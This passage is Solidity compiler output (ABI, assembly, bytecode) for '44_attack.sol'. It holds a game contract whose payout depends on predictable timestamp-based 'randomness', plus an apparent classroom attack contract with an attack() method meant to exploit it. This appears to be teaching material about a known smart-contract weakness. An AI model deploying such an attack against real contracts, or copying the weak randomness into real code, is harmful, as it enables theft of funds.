											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "POP"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "GAS"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "CALL"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "POP"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "POP"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "POP"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "POP"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "JUMPDEST"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "DUP1"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "SWAP1"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "SLOAD"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "SWAP1"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "EXP"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "SWAP1"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "DIV"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "AND"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "DUP2"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc",
							"game()": "c3fe3e28",
							"get_random()": "98107e5b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.4.24+commit.e67f0147\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":true,\"inputs\":[],\"name\":\"get_random\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"game\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"44_attack.sol\":\"class44_attack\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"44_attack.sol\":{\"keccak256\":\"0x49c1c54773e32964655f27184735cf79087b1690aabed4e4648a84ab14e72228\",\"urls\":[\"bzzr://6815d201033f5d48d067fdc3c9d3216a7364436e29771e4d9b8ae683dd81a7ee\"]}},\"version\":1}",
					"userdoc": {
						"methods": {}
					}
				},
				"class44_game": {
					"abi": [
						{
							"constant": true,
							"inputs": [],
							"name": "kk",
							"outputs": [
								{
									"name": "",
									"type": "int256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "play",
							"outputs": [],
							"payable": true,
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "get_random",
							"outputs": [
								{
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"payable": true,
							"stateMutability": "payable",
							"type": "constructor"
						},
						{
							"payable": true,
							"stateMutability": "payable",
							"type": "fallback"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"name": "",
									"type": "address"
								}
							],
							"name": "win",
							"type": "event"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"44_attack.sol\":26:641  contract class44_game{... */\n  mstore(0x40, 0x80)\n    /* \"44_attack.sol\":93:94  1 */\n  0x1\n    /* \"44_attack.sol\":78:94  int public kk =1 */\n  0x0\n  sstore\n    /* \"44_attack.sol\":619:626  1 ether */\n  0xde0b6b3a7640000\n    /* \"44_attack.sol\":606:615  msg.value */\n  callvalue\n    /* \"44_attack.sol\":606:626  msg.value >= 1 ether */\n  lt\n  iszero\n    /* \"44_attack.sol\":598:627  require(msg.value >= 1 ether) */\n  iszero\n  iszero\n  tag_3\n  jumpi\n  0x0\n  dup1\n  revert\ntag_3:\n    /* \"44_attack.sol\":26:641  contract class44_game{... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x0\n  codecopy\n  0x0\n  return\nstop\n\nsub_0: assembly {\n        /* \"44_attack.sol\":26:641  contract class44_game{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x4))\n      calldataload(0x0)\n      0x100000000000000000000000000000000000000000000000000000000\n      swap1\n      div\n      0xffffffff\n      and\n      dup1\n      0x3779c39e\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x93e84cd9\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x98107e5b\n      eq\n      tag_4\n      jumpi\n    tag_1:\n        /* \"44_attack.sol\":534:541  1 ether */\n      0xde0b6b3a7640000\n        /* \"44_attack.sol\":521:530  msg.value */\n      callvalue\n        /* \"44_attack.sol\":521:541  msg.value >= 1 ether */\n      lt\n      iszero\n        /* \"44_attack.sol\":513:542  require(msg.value >= 1 ether) */\n      iszero\n      iszero\n      tag_7\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_7:\n        /* \"44_attack.sol\":26:641  contract class44_game{... */\n      stop\n        /* \"44_attack.sol\":78:94  int public kk =1 */\n    tag_2:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_8\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_8:\n        /* \"44_attack.sol\":78:94  int public kk =1 */\n      pop\n      tag_9\n      jump(tag_10)\n    tag_9:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"44_attack.sol\":256:471  function play() public payable {... */\n    tag_3:\n      tag_11\n      jump(tag_12)\n    tag_11:\n      stop\n        /* \"44_attack.sol\":101:250  function get_random() public view returns(uint){... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x0\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_13:\n        /* \"44_attack.sol\":101:250  function get_random() public view returns(uint){... */\n      pop\n      tag_14\n      jump(tag_15)\n    tag_14:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"44_attack.sol\":78:94  int public kk =1 */\n    tag_10:\n      sload(0x0)\n      dup2\n      jump\t// out\n        /* \"44_attack.sol\":256:471  function play() public payable {... */\n    tag_12:\n        /* \"44_attack.sol\":318:328  0.01 ether */\n      0x2386f26fc10000\n        /* \"44_attack.sol\":305:314  msg.value */\n      callvalue\n        /* \"44_attack.sol\":305:328  msg.value == 0.01 ether */\n      eq\n        /* \"44_attack.sol\":297:329  require(msg.value == 0.01 ether) */\n      iszero\n      iszero\n      tag_17\n      jumpi\n      0x0\n      dup1\n      revert\n    tag_17:\n        /* \"44_attack.sol\":343:344  1 */\n      0x1\n        /* \"44_attack.sol\":339:341  kk */\n      0x0\n      dup1\n        /* \"44_attack.sol\":339:344  kk+=1 */\n      dup3\n      dup3\n      sload\n      add\n      swap3\n      pop\n      pop\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"44_attack.sol\":371:374  500 */\n      0x1f4\n        /* \"44_attack.sol\":357:369  get_random() */\n      tag_18\n        /* \"44_attack.sol\":357:367  get_random */\n      tag_15\n        /* \"44_attack.sol\":357:369  get_random() */\n      jump\t// in\n    tag_18:\n        /* \"44_attack.sol\":357:374  get_random()>=500 */\n      lt\n      iszero\n        /* \"44_attack.sol\":354:465  if(get_random()>=500){... */\n      iszero\n      tag_19\n      jumpi\n        /* \"44_attack.sol\":389:399  msg.sender */\n      caller\n        /* \"44_attack.sol\":389:408  msg.sender.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"44_attack.sol\":389:420  msg.sender.transfer(0.02 ether) */\n      0x8fc\n        /* \"44_attack.sol\":409:419  0.02 ether */\n      0x470de4df820000\n        /* \"44_attack.sol\":389:420  msg.sender.transfer(0.02 ether) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x0\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_20\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x0\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x0\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_20:\n        /* \"44_attack.sol\":389:420  msg.sender.transfer(0.02 ether) */\n      pop\n        /* \"44_attack.sol\":439:454  win(msg.sender) */\n      0xa34cc845dfe7e94da90b41e77f799f7c29c20a39271c97a2469ce08afed0830b\n        /* \"44_attack.sol\":443:453  msg.sender */\n      caller\n        /* \"44_attack.sol\":439:454  win(msg.sender) */\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"44_attack.sol\":354:465  if(get_random()>=500){... */\n    tag_19:\n        /* \"44_attack.sol\":256:471  function play() public payable {... */\n      jump\t// out\n        /* \"44_attack.sol\":101:250  function get_random() public view returns(uint){... */\n    tag_15:\n        /* \"44_attack.sol\":143:147  uint */\n      0x0\n        /* \"44_attack.sol\":158:172  bytes32 ramdon */\n      dup1\n        /* \"44_attack.sol\":202:205  now */\n      timestamp\n        /* \"44_attack.sol\":185:206  abi.encodePacked(now) */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"44_attack.sol\":185:206  abi.encodePacked(now) */\n      swap1\n      0x40\n      mstore\n        /* \"44_attack.sol\":175:207  keccak256(abi.encodePacked(now)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_22:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":51:70   */\n      iszero\n        /* \"--CODEGEN--\":36:189   */\n      iszero\n      tag_23\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_22)\n    tag_23:\n        /* \"--CODEGEN--\":274:275   */\n      0x1\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"44_attack.sol\":175:207  keccak256(abi.encodePacked(now)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      keccak256\n        /* \"44_attack.sol\":158:207  bytes32 ramdon = keccak256(abi.encodePacked(now)) */\n      swap1\n      pop\n        /* \"44_attack.sol\":239:243  1000 */\n      0x3e8\n        /* \"44_attack.sol\":229:235  ramdon */\n      dup2\n        /* \"44_attack.sol\":224:236  uint(ramdon) */\n      0x1\n      swap1\n      div\n        /* \"44_attack.sol\":224:243  uint(ramdon) % 1000 */\n      dup2\n      iszero\n      iszero\n      tag_25\n      jumpi\n      invalid\n    tag_25:\n      mod\n        /* \"44_attack.sol\":217:243  return uint(ramdon) % 1000 */\n      swap2\n      pop\n        /* \"44_attack.sol\":101:250  function get_random() public view returns(uint){... */\n      pop\n      swap1\n      jump\t// out\n\n    auxdata: 0xa165627a7a723058205c80badcd0d42c9be5f3b8553f07e538d2093bd54a880abc980ed9b58f135fb30029\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60806040526001600055670de0b6b3a7640000341015151561002057600080fd5b61028c8061002f6000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633779c39e1461007057806393e84cd91461009b57806398107e5b146100a5575b670de0b6b3a7640000341015151561006e57600080fd5b005b34801561007c57600080fd5b506100856100d0565b6040518082815260200191505060405180910390f35b6100a36100d6565b005b3480156100b157600080fd5b506100ba6101c1565b6040518082815260200191505060405180910390f35b60005481565b662386f26fc10000341415156100eb57600080fd5b600160008082825401925050819055506101f46101066101c1565b1015156101bf573373ffffffffffffffffffffffffffffffffffffffff166108fc66470de4df8200009081150290604051600060405180830381858888f1935050505015801561015a573d6000803e3d6000fd5b507fa34cc845dfe7e94da90b41e77f799f7c29c20a39271c97a2469ce08afed0830b33604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a15b565b60008042604051602001808281526020019150506040516020818303038152906040526040518082805190602001908083835b60208310151561021957805182526020820191506020810190506020830392506101f4565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902090506103e8816001900481151561025957fe5b06915050905600a165627a7a723058205c80badcd0d42c9be5f3b8553f07e538d2093bd54a880abc980ed9b58f135fb30029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x1 PUSH1 0x0 SSTORE PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO ISZERO ISZERO PUSH2 0x20 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x28C DUP1 PUSH2 0x2F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x3779C39E EQ PUSH2 0x70 JUMPI DUP1 PUSH4 0x93E84CD9 EQ PUSH2 0x9B JUMPI DUP1 PUSH4 0x98107E5B EQ PUSH2 0xA5 JUMPI JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO ISZERO ISZERO PUSH2 0x6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x85 PUSH2 0xD0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xA3 PUSH2 0xD6 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xBA PUSH2 0x1C1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH7 0x2386F26FC10000 CALLVALUE EQ ISZERO ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP1 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0x1F4 PUSH2 0x106 PUSH2 0x1C1 JUMP JUMPDEST LT ISZERO ISZERO PUSH2 0x1BF JUMPI CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH7 0x470DE4DF820000 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x15A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH32 0xA34CC845DFE7E94DA90B41E77F799F7C29C20A39271C97A2469CE08AFED0830B CALLER PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 TIMESTAMP PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT ISZERO ISZERO PUSH2 0x219 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x1F4 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 SWAP1 POP PUSH2 0x3E8 DUP2 PUSH1 0x1 SWAP1 DIV DUP2 ISZERO ISZERO PUSH2 0x259 JUMPI INVALID JUMPDEST MOD SWAP2 POP POP SWAP1 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0x5c DUP1 0xba 0xdc 0xd0 0xd4 0x2c SWAP12 0xe5 RETURN 0xb8 SSTORE 0x3f SMOD 0xe5 CODESIZE 0xd2 MULMOD EXTCODESIZE 0xd5 0x4a DUP9 EXP 0xbc SWAP9 0xe 0xd9 0xb5 DUP16 SGT 0x5f 0xb3 STOP 0x29 ",
							"sourceMap": "26:615:0:-;;;93:1;78:16;;619:7;606:9;:20;;598:29;;;;;;;;26:615;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633779c39e1461007057806393e84cd91461009b57806398107e5b146100a5575b670de0b6b3a7640000341015151561006e57600080fd5b005b34801561007c57600080fd5b506100856100d0565b6040518082815260200191505060405180910390f35b6100a36100d6565b005b3480156100b157600080fd5b506100ba6101c1565b6040518082815260200191505060405180910390f35b60005481565b662386f26fc10000341415156100eb57600080fd5b600160008082825401925050819055506101f46101066101c1565b1015156101bf573373ffffffffffffffffffffffffffffffffffffffff166108fc66470de4df8200009081150290604051600060405180830381858888f1935050505015801561015a573d6000803e3d6000fd5b507fa34cc845dfe7e94da90b41e77f799f7c29c20a39271c97a2469ce08afed0830b33604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390a15b565b60008042604051602001808281526020019150506040516020818303038152906040526040518082805190602001908083835b60208310151561021957805182526020820191506020810190506020830392506101f4565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902090506103e8816001900481151561025957fe5b06915050905600a165627a7a723058205c80badcd0d42c9be5f3b8553f07e538d2093bd54a880abc980ed9b58f135fb30029",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0x3779C39E EQ PUSH2 0x70 JUMPI DUP1 PUSH4 0x93E84CD9 EQ PUSH2 0x9B JUMPI DUP1 PUSH4 0x98107E5B EQ PUSH2 0xA5 JUMPI JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO ISZERO ISZERO PUSH2 0x6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x85 PUSH2 0xD0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xA3 PUSH2 0xD6 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xBA PUSH2 0x1C1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH7 0x2386F26FC10000 CALLVALUE EQ ISZERO ISZERO PUSH2 0xEB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP1 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH2 0x1F4 PUSH2 0x106 PUSH2 0x1C1 JUMP JUMPDEST LT ISZERO ISZERO PUSH2 0x1BF JUMPI CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH7 0x470DE4DF820000 SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x15A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH32 0xA34CC845DFE7E94DA90B41E77F799F7C29C20A39271C97A2469CE08AFED0830B CALLER PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP1 TIMESTAMP PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT ISZERO ISZERO PUSH2 0x219 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH1 0x20 DUP4 SUB SWAP3 POP PUSH2 0x1F4 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 